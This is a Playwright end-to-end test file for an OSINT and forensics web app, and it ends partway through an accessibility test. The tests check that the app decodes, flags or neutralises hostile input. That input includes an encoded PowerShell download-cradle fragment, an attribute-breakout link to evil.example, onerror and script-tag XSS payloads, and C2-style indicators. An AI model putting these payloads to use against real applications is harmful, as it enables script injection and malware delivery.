// End-to-end checks for OSINTrix. Every test opens the real app from disk, like a user would.
const { test, expect } = require('@playwright/test');
const { open, capture, fixture, noErrors, APP } = require('./helpers');

const ROUTES = ['#/home', '#/cases', '#/cloud', '#/pad', '#/whatsnew', '#/case/c-lantern/overview', '#/case/c-lantern/vault', '#/case/c-lantern/entities', '#/case/c-lantern/timeline',
  '#/case/c-lantern/graph', '#/case/c-lab/map', '#/case/c-lantern/questions', '#/case/c-lantern/report', '#/toolbox', '#/queries', '#/detections',
  '#/notes', '#/notebook', '#/certs', '#/playbooks', '#/ctf', '#/lab', '#/decoder', '#/feeds', '#/watch', '#/entities', '#/reference', '#/trash', '#/security', '#/help', '#/settings'];

test('every screen draws without errors @phone', async ({ page }) => {
  const errors = await open(page);
  for (const r of ROUTES) {
    await page.evaluate(h => { location.hash = h; }, r);
    await page.waitForTimeout(150);
    await expect(page.locator('#main')).not.toContainText('This screen failed to draw');
  }
  noErrors(errors);
});

test('extracts indicators, including obfuscated and structured ones', async ({ page }) => {
  const errors = await open(page);
  const ents = await page.evaluate(() => extractRich('mail john [at] proton [dot] me, phone: +44 20 7946 0958, 2001:db8::1, https://x.com/n1ghtlamp, T1059.001, IBAN GB82 WEST 1234 5698 7654 32').map(e => e.k + '=' + e.v));
  for (const want of ['email=john@proton.me', 'phone=+442079460958', 'ipv6=2001:db8::1', 'social=x.com/n1ghtlamp', 'handle=@n1ghtlamp', 'ttp=T1059.001', 'iban=GB82WEST12345698765432'])
    expect(ents).toContain(want);
  noErrors(errors);
});

test('parses a FortiGate line into fields and filters by them', async ({ page }) => {
  const errors = await open(page, '#/case/c-portal/timeline');
  await capture(page, 'date=2019-05-10 time=11:50:48 logid="0001000014" type="traffic" vd="vdom1" srcip=172.16.200.254 srcport=62024 dstip=172.16.200.2 dstport=443 proto=6 action="server-rst" service="HTTPS" sentbyte=1247 rcvdbyte=1719');
  const rec = await page.evaluate(() => { const r = DB.records[DB.records.length - 1]; return { title: r.title, ts: new Date(r.ts).toISOString() }; });
  expect(rec.title).toContain('172.16.200.254:62024 → 172.16.200.2:443');
  expect(rec.ts).toBe('2019-05-10T11:50:48.000Z');
  await page.fill('#tlq', 'dst.port:443'); await page.waitForTimeout(400);
  await expect(page.locator('.ev')).toHaveCount(1);
  noErrors(errors);
});

test('imports a CSV log with column mapping', async ({ page }) => {
  const errors = await open(page, '#/case/c-portal/timeline');
  await page.evaluate(() => openCapture());
  const [fc] = await Promise.all([page.waitForEvent('filechooser'), page.click('[data-act=capLog]')]);
  await fc.setFiles(fixture('fortigate-40.csv'));
  await expect(page.locator('#lmPrev .lmr')).toHaveCount(5);
  await page.click('[data-act=logGo]'); await page.waitForTimeout(600);
  expect(await page.evaluate(() => DB.records.filter(r => r.tags.includes('imported')).length)).toBe(40);
  noErrors(errors);
});

test('builds graph relations stated in evidence, and only suggests the rest', async ({ page }) => {
  const errors = await open(page, '#/case/c-portal/timeline');
  await page.evaluate(() => { theCase('c-portal').autoGraph = true; });
  await capture(page, 'Domain Name: lamp-support.example\nRegistrant Email: n1ghtlamp@proton.me\nlamp-support.example resolves to 198.51.100.77');
  const links = await page.evaluate(() => DB.links.filter(l => l.caseId === 'c-portal' && l.auto).map(l => l.label));
  expect(links).toContain('registered by');
  expect(links).toContain('resolves to');
  noErrors(errors);
});

test('encrypts the workspace, locks on reload and unlocks with the passphrase', async ({ page }) => {
  const errors = await open(page, '#/security');
  await page.click('[data-act=secOn]');
  await page.fill('#pw1', 'correct horse battery'); await page.fill('#pw2', 'correct horse battery');
  await page.click('form[data-form=pass] button[type=submit]');
  await expect.poll(() => page.evaluate(() => (localStorage.getItem(STORE_KEY) || '').slice(0, 30))).toContain('osintrix-aes-gcm');
  const before = await page.evaluate(() => DB.records.length);
  await page.reload();
  await expect(page.locator('#unlockP')).toBeVisible();
  await page.fill('#unlockP', 'wrong one'); await page.keyboard.press('Enter');
  await expect(page.locator('#unlockE')).toContainText('does not open');
  await page.fill('#unlockP', 'correct horse battery'); await page.keyboard.press('Enter');
  await expect.poll(() => page.evaluate(() => typeof DB !== 'undefined' && DB && DB.records.length)).toBe(before);
  noErrors(errors);
});

test('audit chain detects edits and custody reports detect tampering', async ({ page }) => {
  const errors = await open(page, '#/home');
  await capture(page, 'evidence for the chain 203.0.113.9');
  const res = await page.evaluate(async () => {
    const m = await custodyManifest(DB.active); const ok = (await custodyVerify(m)).res;
    const bad = JSON.parse(JSON.stringify(m)); bad.records[0].sha256 = '0'.repeat(64); const tampered = (await custodyVerify(bad)).res;
    await auditQ; DB.audit.entries[0].what = 'rewritten history'; const chain = await auditVerify(DB.audit.entries, DB.audit.base);
    return { ok: ok.every(x => x[0] === true), tampered: tampered[0][0], chain: chain.ok };
  });
  expect(res).toEqual({ ok: true, tampered: false, chain: false });
  noErrors(errors);
});

test('archives a saved web page without running its scripts', async ({ page }) => {
  const errors = await open(page, '#/case/c-lantern/timeline');
  let dialogs = 0; page.on('dialog', d => { dialogs++; d.dismiss(); });
  await page.evaluate(() => openCapture());
  const [fc] = await Promise.all([page.waitForEvent('filechooser'), page.click('[data-act=capFiles]')]);
  await fc.setFiles(fixture('forum-post.mhtml'));
  await expect.poll(() => page.evaluate(() => DB.records[DB.records.length - 1].title)).toContain('Web page: Lamp loader v2');
  await page.evaluate(() => { const r = DB.records[DB.records.length - 1]; return attAct('attOpen', r.id, r.att[0].id); });
  await expect(page.locator('.safeframe')).toBeVisible();
  expect(dialogs).toBe(0);
  noErrors(errors);
});

test('photo GPS lands on the case map', async ({ page }) => {
  const errors = await open(page, '#/case/c-lab/timeline');
  await page.evaluate(() => openCapture());
  const [fc] = await Promise.all([page.waitForEvent('filechooser'), page.click('[data-act=capFiles]')]);
  await fc.setFiles(fixture('photo-gps.jpg'));
  await page.waitForTimeout(800);
  await page.evaluate(() => { location.hash = '#/case/c-lab/map'; });
  await expect.poll(() => page.evaluate(() => UI.mapData && UI.mapData.pts.some(p => Math.abs(p.la - 48.8584) < 0.01))).toBe(true);
  noErrors(errors);
});

test('hypothesis board ranks by evidence against', async ({ page }) => {
  const errors = await open(page, '#/case/c-lantern/questions');
  const top = await page.evaluate(() => achScore(theCase('c-lantern').ach).rank[0].h.t);
  expect(top).toContain('Lamp loader');
  noErrors(errors);
});

test('reads a packet capture: DNS, HTTP, TLS SNI/JA3, cleartext logins, beacons', async ({ page }) => {
  const errors = await open(page, '#/lab');
  await page.click('[data-act=labTab][data-v=pcap]');
  for (const f of ['sample.pcap', 'sample.pcapng']) {
    await page.setInputFiles('#pcIn', fixture(f));
    await expect.poll(() => page.evaluate(() => !!(UI.pcap && UI.pcap.flows))).toBe(true);
    const A = await page.evaluate(() => ({ n: UI.pcap.n, dns: UI.pcap.dns.map(d => d.name), http: UI.pcap.http.map(h => h.url), sni: UI.pcap.tls.map(t => t.sni), ja3: UI.pcap.tls[0].ja3,
      creds: UI.pcap.creds.map(c => c.proto + ':' + c.user), find: UI.pcap.findings.map(f => f.title), flags: UI.pcap.flags }));
    expect(A.n).toBe(77);
    expect(A.dns).toContain('updates.lamp-loader.xyz');
    expect(A.http).toContain('http://updates.lamp-loader.xyz/files/update.exe');
    expect(A.sni).toContain('login.microsoftonline.com');
    expect(A.ja3).toBe('a1055821978a49a49eb2ce46cd0ba418');
    expect(A.creds).toEqual(expect.arrayContaining(['HTTP:jdoe', 'HTTP form:jdoe', 'FTP:backup']));
    expect(A.find.join('|')).toMatch(/beacon/);
    expect(A.find.join('|')).toMatch(/several MAC/);
    expect(A.flags).toContain('flag{pcap_follow_the_stream}');
    await page.click('[data-act=pcClear]');
  }
  noErrors(errors);
});

test('opens a Chrome history database with decoded times and deleted-row recovery', async ({ page }) => {
  const errors = await open(page, '#/lab');
  await page.click('[data-act=labTab][data-v=sqlite]');
  await page.setInputFiles('#sqIn', fixture('History'));
  await expect.poll(() => page.evaluate(() => !!(UI.sql && UI.sql.db)), { timeout: 15000 }).toBe(true);
  const S = await page.evaluate(() => ({ arts: UI.sql.arts.map(a => a.id), free: UI.sql.free.found.some(x => /harbour warehouse/.test(x.text)) }));
  expect(S.arts).toEqual(expect.arrayContaining(['chrome-hist', 'chrome-dl', 'chrome-search']));
  expect(S.free).toBe(true);
  await expect(page.locator('.sq-time').first()).toHaveText(/^2026-09-21 14:28:20/);
  await page.click('[data-act=sqView][data-v=sql]');
  await page.fill('#sqSql', 'DELETE FROM urls');
  await page.click('[data-act=sqRun]');
  expect(await page.evaluate(() => UI.sql.db.exec('SELECT count(*) FROM urls')[0].values[0][0])).toBe(4);
  noErrors(errors);
});

test('validates input inline and refuses duplicate names', async ({ page }) => {
  const errors = await open(page, '#/cases');
  await page.evaluate(() => clickAct('newCase'));
  await page.click('#dlg button[type=submit]');
  await expect(page.locator('#dlg .ferr')).toHaveText(/required/);
  const name = await page.evaluate(() => DB.cases[0].name);
  await page.fill('#cName', '  ' + name.toUpperCase() + ' ');
  await page.click('#dlg button[type=submit]');
  await expect(page.locator('#dlg .ferr')).toHaveText(/already exists/);
  await page.evaluate(() => closeDlg());
  await page.evaluate(() => clickAct('toolAdd'));
  await page.fill('#tName', await page.evaluate(() => DB.tools[0].name));
  await page.fill('#tUrl', 'https://example.org/');
  await page.click('#dlg button[type=submit]');
  await expect(page.locator('#dlg .ferr')).toHaveText(/already in the toolbox/);
  await page.evaluate(() => closeDlg());
  const names = await page.evaluate(() => { const p = DB.playbooks[0]; clickAct('pbDup', p.id); clickAct('pbDup', p.id); return DB.playbooks.filter(x => x.name.startsWith(p.name)).map(x => x.name); });
  expect(names).toEqual(expect.arrayContaining([expect.stringMatching(/\(copy\)$/), expect.stringMatching(/\(copy 2\)$/)]));
  const codes = await page.evaluate(() => DB.cases.map(c => c.code));
  expect(new Set(codes).size).toBe(codes.length);
  noErrors(errors);
});

test('auto-decode finds layered and uncommon encodings', async ({ page }) => {
  const errors = await open(page, '#/decoder');
  const run = v => page.evaluate(async x => { const s = await autoDecode(x); return s.length ? s[s.length - 1][1] : ''; }, v);
  expect(await run('aGVsbG8gYW5hbHlzdCwgZmxhZ3thdXRvfQ==')).toBe('hello analyst, flag{auto}');
  expect(await run('YUdWc2JHOGdZVzVoYkhsemRDd2dabXhoWjN0aGRYUnZmUT09')).toBe('hello analyst, flag{auto}');
  expect(await run('68656c6c6f20776f726c64')).toBe('hello world');
  expect(await run('NBSWY3DPEB3W64TMMQ======')).toBe('hello world');
  expect(await run('StV1DL6CwTryKyV')).toBe('hello world');
  expect(await run('01101000 01101001 00100001')).toBe('hi!');
  expect(await run('104 105 33 32 104 105')).toBe('hi! hi');
  expect(await run('synt{ebg_guvegrra}')).toBe('flag{rot_thirteen}');
  expect(await run('.... . .-.. .-.. --- / .-- --- .-. .-.. -..')).toBe('HELLO WORLD');
  expect(await run('powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA')).toContain('IEX (New-Object');
  expect(await run('just a normal sentence')).toBe('');
  noErrors(errors);
});

test('clicks every control on the main screens without an error', async ({ page }) => {
  test.setTimeout(240_000);
  const errors = await open(page);
  const SKIP = new Set(['exportAll', 'resetDemo', 'freshStart', 'removeSample', 'importAll', 'importCase', 'secOn', 'secLock', 'secOff', 'secChange', 'capFiles', 'capLog', 'capWeb', 'attAdd', 'attOpen', 'attDl', 'rsAll', 'printReport', 'helpWelcome', 'refFind', 'pbGo', 'wuImport', 'placesKml', 'placesCsv', 'wuExportAll', 'wuExport', 'nbImport', 'nbAttach', 'nbMediaDl', 'nbLinkGo']);
  for (let r of ['#/home', '#/case/c-lantern/overview', '#/case/c-lantern/entities', '#/case/c-lantern/timeline', '#/case/c-lantern/graph', '#/case/c-lab/map', '#/case/c-lantern/questions', '#/toolbox', '#/lab', '#/security', '#/reference', '#/playbooks', '#/help', '#/cloud', '#/whatsnew', '#/pad', '#/ctf', '#/detections', '#/notebook', 'nb-page']) {
    const nbp = r === 'nb-page'; if (nbp) r = '#/notebook';
    await page.evaluate(([h, nbp]) => { if (h === '#/notebook'){ UI.nbView = nbp ? 'page' : 'lib'; UI.nbPage = DB.nb.pages[2].id; } location.hash = h; renderMain(); }, [r, nbp]); await page.waitForTimeout(200);
    const acts = await page.evaluate(() => [...document.querySelectorAll('#main [data-act]')].map((e, i) => [i, e.dataset.act]));
    for (const [i, a] of acts.slice(0, 60)) {
      if (SKIP.has(a)) continue;
      await page.evaluate(([h, i, a, nbp]) => { closeDlg(); if (h === '#/notebook'){ UI.nbView = nbp ? 'page' : 'lib'; if (!nbPage(UI.nbPage)) UI.nbPage = DB.nb.pages[0].id; } if (location.hash !== h) location.hash = h; renderMain(); const e = document.querySelectorAll('#main [data-act]')[i]; if (e && e.dataset.act === a) e.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true })); }, [r, i, a, nbp]);
      await page.waitForTimeout(40); await page.keyboard.press('Escape');
    }
  }
  noErrors(errors);
});

test('cloud scanner flags IaC and logs, and sends to a case', async ({ page }) => {
  await open(page, "#/cloud");
  // run the Terraform sample
  await page.evaluate(() => CLOUD_ACTS.cloudSample(0, 'Terraform (open SG + public RDS)'));
  await expect(page.locator('.cld-f')).not.toHaveCount(0);
  const n = await page.locator('.cld-f').count();
  expect(n).toBeGreaterThanOrEqual(3);
  // critical SG finding present
  await expect(page.locator('.cld-f.critical').first()).toContainText(/0\.0\.0\.0\/0/);
  // log hunting on CloudTrail sample flags StopLogging
  await page.evaluate(() => CLOUD_ACTS.cloudSample(0, 'CloudTrail (suspicious burst)'));
  await expect(page.locator('.cld-ev')).not.toHaveCount(0);
  await expect(page.locator('.cld-ev', { hasText: 'StopLogging' })).toHaveCount(1);
  // guide copy action is wired (no throw)
  await page.evaluate(() => { UI.cloudTab = 'guide'; renderMain(); });
  await expect(page.locator('.cg-it')).not.toHaveCount(0);
  const list = await page.evaluateHandle(() => document.querySelector('.cg-list'));
  await page.locator('.cg-it').nth(2).click();
  await expect(page.locator('#cgDetail .cg-cmd')).not.toHaveCount(0);
  expect(await page.evaluate(l => l.isConnected, list)).toBe(true);
});

test('scratchpad detects indicators and groups them into lanes', async ({ page }) => {
  await open(page, "#/pad");
  await page.fill('#padText', 'src=203.0.113.9 dport=4444 proto=TCP\nc2 update-lamp.test CVE-2024-3400 sha256 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855');
  await page.waitForTimeout(400);
  await expect(page.locator('.pad-lane')).not.toHaveCount(0);
  await expect(page.locator('.pad-chip', { hasText: '4444' })).toHaveCount(1);
  await expect(page.locator('.pad-chip', { hasText: 'TCP' })).toHaveCount(1);
  await expect(page.locator('.pad-chip', { hasText: 'CVE-2024-3400' })).toHaveCount(1);
  await page.locator('.pad-chip').first().click();
  await expect(page.locator('#padBulk')).toBeVisible();
});

/* ---------- release blockers: data safety and imports ---------- */
const seedStore = async (page, raw) => page.evaluate(async raw => {
  if (typeof TABS !== 'undefined') TABS.writer = false;   // stop this page saving over the seeded data as it unloads
  localStorage.setItem('osintrix-poc:v4', raw);
  await new Promise(res => { const r = indexedDB.open('osintrix', 1); r.onupgradeneeded = () => r.result.createObjectStore('kv');
    r.onsuccess = () => { const tx = r.result.transaction('kv', 'readwrite'); tx.objectStore('kv').put(raw, 'osintrix-poc:v4'); tx.oncomplete = () => { r.result.close(); res(); }; }; });
  await new Promise(res => setTimeout(res, 250));          // Chromium commits localStorage asynchronously; let it land before the reload
}, raw);
const readStore = page => page.evaluate(() => new Promise(res => { const r = indexedDB.open('osintrix', 1);
  r.onsuccess = () => { const q = r.result.transaction('kv').objectStore('kv').get('osintrix-poc:v4'); q.onsuccess = () => res([q.result, localStorage.getItem('osintrix-poc:v4')]); }; }));

test('never overwrites a workspace it cannot read', async ({ page }) => {
  await open(page);
  const newer = JSON.stringify({ v: 3, marker: 'keep-me', cases: [] });
  await seedStore(page, newer);
  await page.reload();
  await expect(page.locator('.recover')).toBeVisible();
  await expect(page.locator('.recover')).toContainText('newer version');
  await page.waitForTimeout(800);
  const [idb, ls] = await readStore(page);
  // the stored copies are never replaced. (Chromium sometimes hasn't committed a localStorage write made just
  // before a reload, so the second copy can be missing; it must never hold anything else.)
  expect(idb).toBe(newer); expect([newer, null]).toContain(ls);
  // damaged data: same, and starting fresh keeps the old copy aside
  await seedStore(page, '{"v":2,"cases":[');
  await page.reload();
  await expect(page.locator('.recover')).toContainText('damaged');
  await page.click('#recFresh');
  await expect.poll(() => page.evaluate(() => typeof DB !== 'undefined' && !!DB && DB.cases.length > 0)).toBe(true);
  const kept = await page.evaluate(() => new Promise(res => { const r = indexedDB.open('osintrix', 1);
    r.onsuccess = () => { const q = r.result.transaction('kv').objectStore('kv').getAllKeys(); q.onsuccess = () => res(q.result.filter(k => String(k).includes(':kept:')).length); }; }));
  expect(kept).toBeGreaterThan(0);
});

test('a second tab is read-only until it takes over', async ({ page, context }) => {
  const errors = await open(page);
  const two = await context.newPage();
  await two.goto(page.url());
  await expect(two.locator('#rotab')).toBeVisible();
  await two.evaluate(() => { DB.cases[0].name = 'Edited in tab two'; mutate('rename'); flush(); });
  await page.waitForTimeout(500);
  expect((await readStore(page))[1]).not.toContain('Edited in tab two');
  // tab one saves; tab two follows
  await page.evaluate(() => { DB.cases[0].name = 'Edited in tab one'; mutate('rename'); flush(); });
  await expect.poll(() => two.evaluate(() => DB.cases[0].name)).toBe('Edited in tab one');
  // take over: tab two becomes the writer, tab one turns read-only
  await two.click('#rotabGo');
  await expect.poll(() => two.evaluate(() => TABS.writer && !document.getElementById('rotab'))).toBe(true);
  await expect.poll(() => page.evaluate(() => !TABS.writer && !!document.getElementById('rotab'))).toBe(true);
  expect(await two.evaluate(() => DB.cases[0].name)).toBe('Edited in tab one');
  // the new writer's saves reach storage, the old one's do not
  await two.evaluate(() => { DB.cases[0].name = 'Saved by tab two'; mutate('rename'); flush(); });
  await page.evaluate(() => { DB.cases[0].name = 'Ignored from tab one'; mutate('rename'); flush(); });
  await expect.poll(async () => (await readStore(two))[1]).toContain('Saved by tab two');
  expect((await readStore(two))[1]).not.toContain('Ignored from tab one');
  noErrors(errors);
});

test('imports are checked: bad IDs are refused, markup in names stays text, files never overwrite', async ({ page }) => {
  const errors = await open(page, '#/case/c-lantern/timeline');
  const feed = (page, obj) => page.evaluate(t => { window.pickFile = (a, cb) => cb(t); }, JSON.stringify(obj));
  // a backup whose IDs try to break out of an attribute
  const bad = await page.evaluate(() => { const d = JSON.parse(JSON.stringify(DB)); d.tools[0].id = '"><a href=https://evil.example style=position:fixed;inset:0>'; return d; });
  await feed(page, bad); await page.evaluate(() => clickAct('importAll'));
  await expect(page.locator('#toast')).toContainText('was not imported');
  expect(await page.evaluate(() => DB.tools.some(t => t.id.includes('"')))).toBe(false);
  // a case file with markup in its code and name, and an attachment ID that already exists here
  const fid = await page.evaluate(async () => { const m = await storeFile(new File(['original bytes'], 'keep.txt', { type: 'text/plain' })); DB.records[0].att = [m]; return m.id; });
  await feed(page, { format: 'osintrix-case', case: { id: 'c1', name: 'Imported <img src=x onerror=alert(1)>', code: '<b>X</b>' }, entries: [{ id: 'v1', type: 'ip', fields: { ip: '192.0.2.9' } }],
    records: [{ id: 'r1', title: 'With file', body: '', att: [{ id: fid, name: 'evil.pdf', type: 'application/pdf', size: 4, sha256: '' }] }], files: { [fid]: 'data:text/html,<script>alert(1)</script>' } });
  await page.evaluate(() => importCase()); await page.waitForTimeout(600);
  expect(await page.evaluate(async fid => (await fileBlob(fid)).text(), fid)).toBe('original bytes');
  const att = await page.evaluate(() => DB.records.find(r => r.title === 'With file').att[0].id);
  expect(att).not.toBe(fid);
  // the context menu shows the code as text
  await page.evaluate(() => { const c = DB.cases[DB.cases.length - 1]; showMenu(10, 10, [{ label: 'x', fn: () => {} }], ico('folder', 'sm') + esc(c.code) + c.name); });
  expect(await page.locator('#ctx .ctx-title img, #ctx .ctx-title b').count()).toBe(0);
  await expect(page.locator('#ctx .ctx-title')).toContainText('<b>X</b>');
  // the "PDF" that is really HTML is not opened as a page
  expect(await page.evaluate(async att => sniffKind(await fileBlob(att)), att)).toBe('markup');
  noErrors(errors);
});

test('extractor stays fast on hostile input', async ({ page }) => {
  await open(page);
  const ms = await page.evaluate(() => { const t = performance.now(); Engine.extract('a.'.repeat(50000)); Engine.extract('1.'.repeat(50000)); Engine.extract('a-'.repeat(50000) + '@'); return performance.now() - t; });
  expect(ms).toBeLessThan(1500);
});

test('the audit chain and custody reports cannot be forged by editing data', async ({ page }) => {
  const errors = await open(page, '#/home');
  await capture(page, 'first record 198.51.100.1'); await capture(page, 'second record 198.51.100.2');
  const r = await page.evaluate(async () => {
    await auditQ; const A = DB.audit;
    // forge: drop an entry, then recompute every link with plain SHA-256, as an editor of the stored JSON would
    const forged = JSON.parse(JSON.stringify(A.entries)); forged.splice(1, 1); let prev = A.base || 'genesis';
    for (const [k, e] of forged.entries()) { e.i = k; e.d = await sha256hex(`${e.i}|${e.at}|${e.c}|${e.what}`); e.h = await sha256hex(prev + '|' + e.d); delete e.m; prev = e.h; }
    const forgedLooksPlain = (await auditVerify(forged, A.base)).ok;
    // keyed entries rewritten without the key
    const keyed = JSON.parse(JSON.stringify(A.entries)); keyed.splice(1, 1); prev = A.base || 'genesis';
    for (const [k, e] of keyed.entries()) { e.i = k; e.d = await sha256hex(`${e.i}|${e.at}|${e.c}|${e.what}`); e.h = await sha256hex(prev + '|' + e.d); prev = e.h; }
    const keyedForged = (await auditVerify(keyed, A.base)).ok;
    const real = await auditVerify(A.entries, A.base);
    // a report re-signed with a fresh key: valid signature, but not trusted
    const m = await custodyManifest(DB.active); m.records[0].title = 'edited';
    const kp = await crypto.subtle.generateKey({ name: 'ECDSA', namedCurve: 'P-256' }, true, ['sign', 'verify']); const jwk = await crypto.subtle.exportKey('jwk', kp.publicKey);
    m.key = { alg: 'ECDSA-P256-SHA256', jwk: { kty: 'EC', crv: jwk.crv, x: jwk.x, y: jwk.y }, fingerprint: await keyFp(jwk) };
    const { signature, ...body } = m; m.signature = b64e8(await crypto.subtle.sign({ name: 'ECDSA', hash: 'SHA-256' }, kp.privateKey, new TextEncoder().encode(canon(body))));
    const resigned = await custodyVerify(m);
    // the private key is not in the workspace or a backup
    let saved = null; window.download = (n, text) => { saved = text; }; await exportEverything(false);
    return { real: real.ok, keyedEntries: real.keyed > 0, keyedForged, forgedPlainHasNoKeyedEntries: forgedLooksPlain,
      resignedFirst: resigned.res[0][0], privInDB: JSON.stringify(DB).includes('"d":"') && !!(DB.security.sign || {}).priv, privInBackup: /"priv"/.test(saved || '') };
  });
  expect(r.forgedPlainHasNoKeyedEntries).toBe(false); expect(r.real).toBe(true); expect(r.keyedEntries).toBe(true); expect(r.keyedForged).toBe(false);
  expect(r.resignedFirst).toBe('warn'); expect(r.privInDB).toBe(false); expect(r.privInBackup).toBe(false);
  noErrors(errors);
});

test('large cases save in pieces and open on the board without freezing', async ({ page }) => {
  test.setTimeout(90000);
  const errors = await open(page, '#/home');
  const r = await page.evaluate(async () => {
    const c = DB.active || DB.cases[0].id, t = Date.now(), ip = i => `10.${(i >> 16) & 255}.${(i >> 8) & 255}.${i & 255}`;
    for (let i = 0; i < 2400; i++) DB.records.push({ id: 'big' + i, caseId: c, type: 'note', at: t - i * 1000, created: t, title: 'host ' + ip(i), text: `seen ${ip(i)} with ${ip(i + 1)}`, ents: [{ k: 'ipv4', v: ip(i) }, { k: 'ipv4', v: ip(i + 1) }], tags: [] });
    flush(); await new Promise(res => setTimeout(res, 400));
    let core = await IDB.get(STORE_KEY); if (typeof core === 'string') core = JSON.parse(core); const chunks = core && core.__rc ? core.__rc.n : 0;
    DB.records.find(x => x.id === 'big5').title = 'changed'; const t0 = performance.now(); flush(); const ms = performance.now() - t0;
    await new Promise(res => setTimeout(res, 400));
    const back = await loadAll(), n = back.records.length, changed = back.records.find(x => x.id === 'big5').title;
    const types = ['ip', 'domain', 'email', 'username', 'person'];
    for (let i = 0; i < 2000; i++) { const ty = types[i % 5]; DB.entries.push({ id: 'g' + i, caseId: c, type: ty, fields: { [TYPES[ty].fields[0][0]]: 'n' + i + '.example' }, priority: 'medium', tags: [], notes: '', created: t }); }
    for (let i = 1; i < 2000; i++) DB.links.push({ id: 'gl' + i, caseId: c, a: 'g' + i, b: 'g' + Math.floor(i / 3), label: 'rel', conf: 2 });
    cache = {}; DB.active = c; location.hash = '#/home'; await new Promise(res => setTimeout(res, 200));
    const g0 = performance.now(); location.hash = '#/case/' + c + '/graph'; for (let i = 0; i < 750 && !(cy && cy.nodes().length > 1000); i++) await new Promise(res => setTimeout(res, 20));
    return { chunks, ms, n, changed, graphMs: performance.now() - g0, nodes: cy ? cy.nodes().length : 0 };
  });
  expect(r.chunks).toBeGreaterThan(1); expect(r.ms).toBeLessThan(250); expect(r.n).toBeGreaterThan(2400); expect(r.changed).toBe('changed');
  expect(r.nodes).toBeGreaterThan(1000); expect(r.graphMs).toBeLessThan(15000);
  noErrors(errors);
});

test('CTF: work log, flag check, write-up and cheatsheets', async ({ page }) => {
  const errors = await open(page, '#/ctf');
  await page.evaluate(() => { const c = DB.ctf.chals.find(x => x.name === 'Hidden layers'); UI.ctfSel = c.id; renderMain(); });
  await page.click('[data-act=ctfKind][data-v=ok]'); await page.fill('#ctfLogIn', 'Data after IEND\n$ binwalk -e layers.png'); await page.click('[data-act=ctfLogAdd]');
  await expect(page.locator('.att')).toHaveCount(1); await expect(page.locator('.att .code')).toContainText('binwalk -e layers.png');
  await page.fill('#ctfFlagIn', 'nope'); await expect(page.locator('.flagin')).toHaveClass(/bad/);
  await page.fill('#ctfFlagIn', 'FLAG{ok}'); await expect(page.locator('.flagin')).toHaveClass(/ok/);
  await page.click('[data-act=ctfSolve]');
  expect(await page.evaluate(() => DB.ctf.chals.find(x => x.name === 'Hidden layers').status)).toBe('solved');
  await page.click('[data-act=wuFromChal]'); await page.click('form[data-form=wu] button[type=submit]');
  await expect(page.locator('.reader .md-code')).toContainText('binwalk');
  // write-ups: grouped by event, a category filter behind one button
  await page.click('[data-act=ctfTab][data-v=writeups]');
  await expect(page.locator('.wl2-g').first()).toBeVisible(); const all = await page.locator('.wl2-i').count();
  await page.click('[data-act=wuFilt]'); await page.click('#ctx .ctx-it:has-text("Crypto")');
  await expect(page.locator('.wl2-cf')).toContainText('Crypto only'); expect(await page.locator('.wl2-i').count()).toBeLessThan(all);
  await page.click('.wl2-cf [data-act=wuCat]'); await expect(page.locator('.wl2-i')).toHaveCount(all);
  // cheatsheets: the Reference-style tree, values in a popover
  await page.evaluate(() => { UI.ctfTab = 'cheats'; UI.csCat = 'web'; renderMain(); });
  await expect(page.locator('.cs4-rail .rf4-g.open .rf4-gh')).toContainText('Web');
  await expect(page.locator('.cs4-pop')).toBeHidden(); await page.click('.cs4-vb'); await expect(page.locator('.cs4-pop')).toBeVisible();
  await page.fill('[data-csvar=target]', '10.10.11.42');
  await expect(page.locator('.csr code').first()).toContainText('10.10.11.42'); await expect(page.locator('#csValsSum')).toContainText('10.10.11.42');
  await page.keyboard.press('Escape'); await expect(page.locator('.cs4-pop')).toBeHidden();
  const grp = page.locator('.cs4-rail .rf4-s').nth(1), gname = (await grp.locator('span').textContent()).trim(); await grp.click();
  await expect(page.locator('.csl-h')).toHaveCount(1); await expect(page.locator('.csl-h')).toContainText(gname);
  await page.fill('#csq', 'steghide'); await expect(page.locator('.cs-blk')).not.toHaveCount(0);
  await page.click('[data-act=ctfCheat][data-v=stego]'); await page.click('[data-act=csView][data-v=first]'); await page.click('[data-act=csFm][data-v="0"]');
  expect(await page.evaluate(() => DB.ctf.fm.stego)).toEqual([0]); await expect(page.locator('#csFmN')).toContainText('1/');
  expect(await page.evaluate(() => csFill('holehe target@example.com'))).toBe('holehe target@example.com');   // an email address is not a target
  noErrors(errors);
});

test('places, reference and packs load', async ({ page }) => {
  const errors = await open(page, '#/case/c-lab/map');
  await expect(page.locator('.pcard')).toHaveCount(1);
  await expect(page.locator('.pcard .plink', { hasText: 'Google Maps' })).toHaveAttribute('href', /google\.com\/maps\/search\/\?api=1&query=59\.9/);
  const n = await page.evaluate(() => ({ ref: Object.values(refAll().secs).reduce((a, S) => a + S.rows.length, 0), pb: (ensurePlaybooks(), DB.playbooks.length), cg: cgAll().reduce((a, g) => a + g.cards.length, 0), rules: (ensureRules(), DB.rules.length) }));
  expect(n.ref).toBeGreaterThan(1000); expect(n.pb).toBeGreaterThan(50); expect(n.cg).toBeGreaterThan(90);
  await page.evaluate(() => { location.hash = '#/reference'; UI.refQ = 'AADSTS50126'; renderMain(); });
  await expect(page.locator('.rf2-r').first()).toContainText('50126');
  noErrors(errors);
});

test('no serious accessibility problems on the main screens, light and dark', async ({ page }) => {
  test.setTimeout(300_000);
  const AxeBuilder = require('@axe-core/playwright').default;
  const errors = await open(page, '#/home');
  const routes = ['#/home', '#/case/c-lantern/graph', '#/case/c-lantern/timeline', '#/case/c-lantern/entities', '#/case/c-lab/map', '#/case/c-lantern/questions', '#/case/c-lantern/overview', '#/case/c-lantern/vault',
    '#/toolbox', '#/queries', '#/lab', '#/cloud', '#/ctf', '#/reference', '#/playbooks', '#/feeds', '#/detections', '#/notes', '#/security', '#/whatsnew', '#/help', '#/settings', 'ctf-ws', 'ctf-cheats', 'ctf-wu', 'nb-page', 'nb-export', '#/notebook', 'cx-dec', 'cx-chain', 'cx-csr', 'cx-pe', 'cx-cmp', 'cx-ct', 'cx-guide', 'welcome'];
  const found = [];
  for (const theme of ['light', 'dark']) {
    await page.evaluate(t => { DB.prefs.theme = t; applyPrefs(); renderAll(); }, theme);
    for (const r of routes) {
      await page.evaluate(r => { closeWelcome();
